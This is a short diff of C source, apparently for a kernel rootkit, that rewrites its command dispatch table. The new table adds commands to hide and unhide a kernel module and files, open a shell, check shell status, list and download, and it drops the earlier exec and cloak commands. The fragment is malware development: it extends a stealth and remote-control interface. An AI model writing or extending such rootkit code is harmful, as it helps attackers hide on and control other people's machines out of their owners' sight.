@@ -9,17 +9,19 @@ struct rk_dispatch_entry {
 	rk_handler_t	handler;
 };
 
-// Expand this table with all 20 commands.
-// Longer prefixes first (greedy match).
+// Longer prefixes first so greedy match works correctly.
 static const struct rk_dispatch_entry dispatch_table[] = {
-	{ "DOWNLOAD ",  9, cmd_download },
-	{ "EXEC ",      5, cmd_exec     },
-	{ "UNCLOAK",    7, cmd_uncloak  },
-	{ "STATUS",     6, cmd_status   },
-	{ "SHELL",      5, cmd_shell    },
-	{ "CLOAK",      5, cmd_cloak    },
-	{ "PING",       4, cmd_ping     },
-	{ "INFO",       4, cmd_info     },
+	{ "UNHIDE MODULE",  13, cmd_unhide_module },
+	{ "SHELL STATUS",   12, cmd_shell_status  },
+	{ "UNHIDE FILE ",   12, cmd_unhide_file   },
+	{ "HIDE MODULE",    11, cmd_hide_module   },
+	{ "HIDE FILE ",     10, cmd_hide_file     },
+	{ "DOWNLOAD ",       9, cmd_download      },
+	{ "STATUS",          6, cmd_status        },
+	{ "SHELL ",          6, cmd_shell         },
+	{ "LIST ",           5, cmd_list          },
+	{ "QUIT",            4, cmd_quit          },
+	{ "INFO",            4, cmd_info          },
 };
 
 static size_t strip_trailing(const u8 *buf, size_t len)
